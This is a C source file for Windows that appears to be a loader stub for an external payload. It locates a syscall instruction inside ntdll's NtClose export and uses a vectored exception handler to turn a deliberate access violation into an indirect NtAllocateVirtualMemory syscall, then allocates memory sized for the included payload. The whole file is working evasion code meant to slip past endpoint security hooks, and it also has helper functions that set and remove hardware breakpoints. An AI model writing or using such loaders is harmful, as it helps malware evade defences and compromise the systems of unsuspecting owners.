#include <windows.h>
#include <stdio.h>
#include "Payload.h"

#pragma warning( disable : 4334 )

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS( NTAPI* fnNtAllocateVirtualMemory )(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
    );
fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
ULONG_PTR SyscallAddr;

BOOL SetHwBp( HANDLE hThread, PVOID pAddress, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        printf( "GetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = ( DWORD_PTR )pAddress; break;
    case 1: ctx.Dr1 = ( DWORD_PTR )pAddress; break;
    case 2: ctx.Dr2 = ( DWORD_PTR )pAddress; break;
    case 3: ctx.Dr3 = ( DWORD_PTR )pAddress; break;
    default: return FALSE;
    }

    ctx.Dr7 |= ( 1 << ( regIndex * 2 ) );
    ctx.Dr7 &= ~( 1 << ( 16 + regIndex * 4 ) );
    ctx.Dr7 &= ~( 1 << ( 17 + regIndex * 4 ) );


    if ( !SetThreadContext( hThread, &ctx ) ) {
        printf( "SetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}

BOOL RemoveHwBp( HANDLE hThread, DWORD regIndex ) {

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) ) {
        printf( "GetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    switch ( regIndex ) {
    case 0: ctx.Dr0 = 0; break;
    case 1: ctx.Dr1 = 0; break;
    case 2: ctx.Dr2 = 0; break;
    case 3: ctx.Dr3 = 0; break;
    default: return FALSE;
    }

    ctx.Dr7 &= ~( 1 << ( regIndex * 2 ) );

    if ( !SetThreadContext( hThread, &ctx ) ) {
        printf( "SetThreadContext failed: %d\n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}

LONG WINAPI VectoredHandler( PEXCEPTION_POINTERS pExceptionInfo ) {

    if ( pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION ) {

        printf( "Access violation at address: 0x%p\n", pExceptionInfo->ExceptionRecord->ExceptionAddress );
        pExceptionInfo->ContextRecord->R10 = pExceptionInfo->ContextRecord->Rcx;
        pExceptionInfo->ContextRecord->Rax = pExceptionInfo->ContextRecord->Rip;

        pExceptionInfo->ContextRecord->Rip = ( DWORD_PTR )SyscallAddr;

        pExceptionInfo->ContextRecord->EFlags |= 0x10000;

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

ULONG_PTR FindSysAddr( HMODULE hModule, LPCSTR lpFunctionName ) {

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;
    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( BYTE* )hModule + pDosHeader->e_lfanew );
    if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = ( PIMAGE_EXPORT_DIRECTORY )( ( BYTE* )hModule + pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    if ( !pExportDir ) {
        return 0;
    }

    PDWORD pAddressOfFunctions = ( PDWORD )( ( BYTE* )hModule + pExportDir->AddressOfFunctions );
    PDWORD pAddressOfNames = ( PDWORD )( ( BYTE* )hModule + pExportDir->AddressOfNames );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( BYTE* )hModule + pExportDir->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDir->NumberOfNames; i++ ) {
        LPCSTR funcName = ( LPCSTR )( ( BYTE* )hModule + pAddressOfNames[ i ] );
        PBYTE funcAddress = ( BYTE* )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ];
        if ( strcmp( funcName, lpFunctionName ) == 0 ) {

            for ( DWORD j = 0; j < 32; j++ ) {
                if ( funcAddress[ j ] == 0x0F && funcAddress[ j + 1 ] == 0x05 ) {
                    SyscallAddr = ( DWORD_PTR )( funcAddress + j );
                    // printf( "Syscall address for %s found at: 0x%p\n", lpFunctionName, ( PVOID )SyscallAddr );
                    return SyscallAddr;
                }
            }

        }
    }

    return 0;

}

int main( void ) {

    SyscallAddr = FindSysAddr( GetModuleHandleA( "ntdll.dll" ), "NtClose" );
    if ( SyscallAddr == 0 ) {
        printf( "Failed to find syscall address for NtClose\n" );
        return 1;
    }
    printf( "Syscall address for NtClose: 0x%p\n", ( PVOID )SyscallAddr );

    HMODULE hNtdll = LoadLibraryA( "ntdll.dll" );

    DWORD NtAllocateVirtualMemory_SSN = 0x18;

    pNtAllocateVirtualMemory = ( fnNtAllocateVirtualMemory )NtAllocateVirtualMemory_SSN;

    if ( !pNtAllocateVirtualMemory ) {
        printf( "Failed to get NtAllocateVirtualMemory address\n" );
        return 1;
    }

    AddVectoredExceptionHandler( 1, VectoredHandler );

    NTSTATUS status;
    PVOID pBaseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;

    // SetHwBp( GetCurrentThread(), ( PVOID )pNtAllocateVirtualMemory, 0 );

    getchar();
    status = pNtAllocateVirtualMemory( GetCurrentProcess(), &pBaseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !NT_SUCCESS( status ) ) {
        printf( "Failed to allocate memory: 0x%X\n", status );
        return 1;
    }

    printf( "[+] Allocated %d bytes at %p\n", payloadSize, pBaseAddress );

    // RemoveHwBp( GetCurrentThread(), 0 );

    return 0;
}